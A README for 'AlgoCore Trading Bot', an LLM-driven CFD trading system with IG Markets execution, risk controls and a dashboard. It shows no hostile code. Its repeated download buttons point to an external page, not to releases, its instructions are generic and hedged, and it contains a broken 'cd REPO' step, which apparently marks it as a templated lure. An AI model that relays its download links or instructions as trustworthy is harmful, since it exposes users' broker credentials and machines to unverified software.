# AlgoCore Trading Bot - AI Trading Bot 2026

> **AlgoCore Trading Bot is a Python-based automated CFD trading system that combines LLM market analysis, IG Markets execution, deterministic risk controls, and a React supervision dashboard.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/gabe-kellyhigc2322/algocore-trading-executor?style=flat-square)](https://github.com/gabe-kellyhigc2322/algocore-trading-executor)

---

<p align="center">
  <a href="https://gabe-kellyhigc2322.github.io/algocore-trading-executor/">
    <img src="https://img.shields.io/badge/Download-AlgoCore%20Trading%20Bot%20Latest-brightgreen?style=for-the-badge" alt="Download AlgoCore Trading Bot">
  </a>
</p>

> **[Download AlgoCore Trading Bot latest build](https://gabe-kellyhigc2322.github.io/algocore-trading-executor/)**

---

[Download Latest Build](https://gabe-kellyhigc2322.github.io/algocore-trading-executor/)

---

## Overview

AlgoCore Trading Bot is a Python application built for automated CFD trading workflows. Its analysis process uses two language-model stages: the first screens markets, and the second assesses possible trades. The application supports Google Gemini as well as OpenAI-compatible endpoints, and approved orders can be routed to IG Markets.

Trading decisions are accompanied by defined controls for position sizing, stop-loss and take-profit behavior, and daily drawdown protection. A React dashboard offers live operational oversight, while weekly and monthly review features support continued performance evaluation.

---

## Core Capabilities

- Market screening and trade evaluation through a two-step LLM workflow
- Google Gemini support alongside OpenAI-compatible endpoints
- Quota-based fallback across Gemini API keys
- Order execution through IG Markets for supported CFD workflows
- Deterministic safeguards applied to trading operations
- Fail-closed position-sizing controls
- Automated stop-loss and take-profit enforcement
- Daily drawdown protection and trading breaker
- React dashboard for live supervision
- Weekly and monthly performance review functionality

---

## Getting Started

First, check out the repository and create a dedicated Python environment:

```bash
git clone https://github.com/gabe-kellyhigc2322/algocore-trading-executor.git
cd REPO

python -m venv .venv
source .venv/bin/activate
```

PowerShell users on Windows can enable the environment with:

```powershell
.venv\Scripts\Activate.ps1
```

When the repository includes a dependency file, install the listed packages:

```bash
pip install -r requirements.txt
```

Provide the necessary model-provider and broker configuration, then run the Python service through the repository entry point:

```bash
python main.py
```

For repositories where the dashboard is maintained as its own frontend package, install and run it from that dashboard directory:

```bash
npm install
npm run dev
```

---

## Operating Workflow

The normal operating sequence looks like this:

1. Enter the LLM provider settings and IG Markets connection details.
2. Launch the Python trading service.
3. Let the screening phase inspect the available market data.
4. Have the decision phase assess candidates using the configured risk rules.
5. Use the React dashboard to observe current activity.
6. Examine the weekly and monthly performance reports.
7. Stop the service before modifying live-trading or risk-related parameters.

For first-time setup, begin with the test or non-live account facilities available through the broker configuration. Enable live execution only after the workflow has been reviewed.

---

## Settings and Environment

Place credentials and runtime values in the environment or configuration files supported by the project. Secrets should not be committed to source control.

A sample environment arrangement is shown below:

```dotenv
GEMINI_API_KEY=your_gemini_key
OPENAI_API_KEY=your_compatible_endpoint_key
IG_USERNAME=your_ig_username
IG_PASSWORD=your_ig_password
IG_API_KEY=your_ig_api_key
IG_ACCOUNT_ID=your_account_id
```

Use the repository's supported settings to define the selected model, endpoint information, position-sizing behavior, stop-loss and take-profit rules, and daily drawdown thresholds. Where the runtime supports multiple Gemini keys, quota failover can be enabled by configuring those keys as expected by the application.

---

## System Requirements

- Python runtime
- Access to a supported Google Gemini or OpenAI-compatible LLM endpoint
- IG Markets account with API access for trade execution
- Node.js and npm when the React dashboard is built or operated separately
- Network connectivity to the broker and model providers
- Storage for configuration data and performance records

Results are affected by market conditions, model-provider responses, broker uptime, and the selected controls. Before enabling automated execution, inspect the project behavior and review the terms that apply to the relevant account.

---

## Common Questions

### What language-model services can be used?

The bot works with Google Gemini and OpenAI-compatible endpoints. Credentials, endpoint details, and related provider options must be supplied through the supported project configuration.

### How does order execution work?

Once the analysis stages and risk controls authorize an action, the execution component is designed to submit supported orders through IG Markets.

### Where can I change the risk rules?

Risk values belong in the environment or configuration locations recognized by the project. Check the repository's configuration template or settings module to identify the applicable options.

### What occurs after the daily drawdown threshold is exceeded?

The daily drawdown breaker is designed to stop additional automated activity once its configured limit is reached. Verify the implementation's current behavior before treating it as a live-trading safeguard.

### Is there a live monitoring interface?

Yes. A React dashboard is included for live supervision, and the project also contains weekly and monthly performance review capabilities.

### How can I troubleshoot a dashboard that will not launch?

Confirm that Node.js and npm are installed. Then install the frontend packages from the dashboard directory and check that the Python service, connection settings, and required provider access are available.

### Does the bot support Gemini quota fallback?

Yes. Gemini API key quota failover is part of the feature set. Configure additional keys using the format expected by the application.

### Where can I find new versions?

Review the repository's releases and change history for new builds, configuration updates, and compatibility information.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
